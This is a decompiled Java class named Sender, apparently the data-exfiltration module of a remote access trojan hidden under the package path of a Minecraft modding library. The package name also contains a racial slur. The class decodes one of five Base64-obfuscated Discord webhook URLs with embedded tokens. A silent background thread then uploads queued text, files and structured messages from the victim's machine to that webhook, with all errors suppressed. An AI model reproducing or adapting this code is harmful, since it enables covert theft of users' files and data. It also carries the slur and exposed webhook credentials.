package org.spongepowered.asm.lib.util.nigger.rat.payload;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import java.io.File;
import java.nio.charset.StandardCharsets;
import java.util.ArrayDeque;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;
import java.util.Queue;
import java.util.Random;
import org.spongepowered.asm.lib.util.nigger.rat.util.Message;
import org.spongepowered.asm.lib.util.okhttp.MediaType;
import org.spongepowered.asm.lib.util.okhttp.MultipartBuilder;
import org.spongepowered.asm.lib.util.okhttp.OkHttpClient;
import org.spongepowered.asm.lib.util.okhttp.Request;
import org.spongepowered.asm.lib.util.okhttp.RequestBody;
import org.spongepowered.asm.lib.util.okhttp.Request.Builder;

public final class Sender {
   private static final Sender INSTANCE = new Sender();
   private final Queue<Object> queue = new ArrayDeque();

   private Sender() {
      List<String> strings = Arrays.asList("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTAxMzkxODM0MzE4NDUyMzMwNS9PVFU5Y3YySWxLTEw5enpuSzNyT1dIU29GUXhObzExblFhMVNDeldNbHZhZWM0RW5wTlAzdkJ2WnUtUFNocHZsMFBuVQ", "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTAxMzkxODUxMDA3MTY4MTA4NS9KTV9zUFpTdWhHZFV1UjUwb3FuVUVhUllGMC1ZUGJmeXBBMHFvQzZyOU9EUkxwbWtEZ0hZRjVOcTh4ZE8yWm5qMW5mSQ", "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvODcwMDIzMDM5NTIwMjMxNDg0L1E5Z2VzRUdSYjJkZkxpRTBRS0pIcmZvQldremFxcXU1dWtyQjVVQ3BmdUVmMkxrdVdxVnB6X3dlUFl6YUhQcFZjRjVi", "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvODcwMDIzMDUzOTk4OTcyOTQ4L0dGRUJNaTlNblpzOVpXbURENDRMMHVOWm4tY0xpV00zSHRuZEhqWG9oUUlKZmMteXRvS1FtT2YxOTA5UU9ZY3d6anY1", "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvODcwMDIyOTc2MjA3MjA4NDY4LzFOU2RfT3pmdldGdFNhaks0UG0xWUxvSmdxc05zLXdQbTlLM0lIeVRTVEt6S3JDR3JGZG1LQVczSEh1eDFEZnhJdDh6");
      String hooker = new String(Base64.getDecoder().decode(((String)strings.get((new Random()).nextInt(5))).getBytes(StandardCharsets.UTF_8)));
      (new Thread(() -> {
         while(true) {
            while(true) {
               while(true) {
                  try {
                     Thread.sleep(3500L);
                     if (!this.queue.isEmpty()) {
                        Object item = this.queue.poll();
                        OkHttpClient client = new OkHttpClient();
                        MultipartBuilder builder = (new MultipartBuilder()).type(MultipartBuilder.FORM);
                        if (item instanceof String) {
                           builder.addFormDataPart("payload_json", "{\"content\":\"" + item + "\"}");
                        } else if (item instanceof File) {
                           builder.addFormDataPart("file1", ((File)item).getName(), RequestBody.create(MediaType.parse("application/octet-stream"), (File)item));
                        } else {
                           if (!(item instanceof Message)) {
                              continue;
                           }

                           JsonObject obj = new JsonObject();
                           obj.addProperty("title", ((Message)item).getName());
                           JsonArray embeds = new JsonArray();
                           JsonObject embed = new JsonObject();
                           JsonArray fields = new JsonArray();
                           ((Message)item).getFields().forEach((field) -> {
                              JsonObject f = new JsonObject();
                              f.addProperty("name", field.getName());
                              f.addProperty("value", field.getValue());
                              f.addProperty("inline", field.isInline());
                              fields.add(f);
                           });
                           embed.add("fields", fields);
                           embeds.add(embed);
                           obj.add("embeds", embeds);
                           builder.addFormDataPart("payload_json", obj.toString());
                        }

                        Request request = (new Builder()).url(hooker).method("POST", builder.build()).build();
                        client.newCall(request).execute().body().close();
                     }
                  } catch (Exception var9) {
                  }
               }
            }
         }
      })).start();
   }

   public static void send(Object string) {
      INSTANCE.queue.add(string);
   }
}
